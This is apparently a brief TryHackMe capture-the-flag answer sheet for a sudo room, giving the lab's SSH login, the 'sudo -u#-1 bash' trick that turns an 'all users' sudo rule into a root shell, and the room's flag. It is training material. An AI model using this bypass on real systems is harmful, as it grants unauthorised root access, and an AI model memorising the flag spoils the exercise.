IP address : 10.10.19.136

for connection used ssh  at port 2222
user name tryhackme and password tryhackme
#1. What command are you allowed to run with sudo?
Ans. run sudo -l found /bin/bash user for all

#2 What is the flag in /root/root.txt?
Ans. Run sudo -u#-1 bash to go into root then run cat /root/root.txt
found the flag THM{l33t_s3cur1ty_bypass}

